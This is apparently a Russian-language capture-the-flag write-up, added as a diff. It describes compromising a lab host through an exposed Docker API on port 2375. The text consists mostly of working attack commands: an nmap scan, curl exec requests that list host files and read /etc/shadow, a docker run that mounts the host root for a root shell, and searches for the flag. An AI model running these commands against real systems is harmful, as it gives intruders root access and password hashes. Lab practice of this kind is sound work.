@@ -1,0 +1,46 @@
+1)Просканировали указанный ip-шник nmap-ом командой:
+
+sudo nmap -T4 -p 80,443,1883,502,2375,47808,161,162 10.10.13.0/24 -oN critical_ports.txt
+
+Чтобы получить отчёт о состоянии портов на указанном ip-шнике
+
+2)Затем в полученном отчёте заметили, что порт докера выглядит уязвимым и отправили команду:
+
+curl http://10.10.13.26:2375/containers/json
+
+В которой получили json-файл о состоянии контейнеров
+
+3)Исходя из этого json-файла отправили следующие запросы:
+ Получить список файлов на хосте:
+curl -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Cmd": ["ls", "-la", "/hostdir/etc"]}' \
+  http://10.10.13.26:2375/containers/82b4f0f6fe52/exec
+
+ Попытаться читать /etc/shadow:
+curl -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Cmd": ["cat", "/hostdir/etc/shadow"]}' \
+  http://10.10.13.26:2375/containers/82b4f0f6fe52/exec
+{"Id":"f38a6679696311383b8afd4783c73475c6ebaf3fa07d07659951d8693bdbe0c8"}
+{"Id":"1d2b01f6ef4f951fd1481fa47073351922f16b0391cd54732933863a87bba000"}
+
+
+docker -H tcp://10.10.13.26:2375 images
+
+docker -H tcp://10.10.13.26:2375 run -it -v /:/mnt --rm ubuntu:22.04 chroot /mnt /bin/bash
+rwhoami  # → root:/# whoami  # → root    
+cat /etc/shadow  # Просмотр хешей паролей
+
+
+Далее используем поиск по sql базе данных:
+# Рекурсивный поиск по ключевым словам
+grep -r "FLAG{" / 2>/dev/null
+grep -r "flag{" / 2>/dev/null
+find / -name "*flag*" 2>/dev/null
+
+# Проверка домашних каталогов
+ls -la /home/*/ /root/
+cat /home/*/flag.txt /root/flag.txt 2>/dev/null
+
+И находим требуемый флаг по названию.
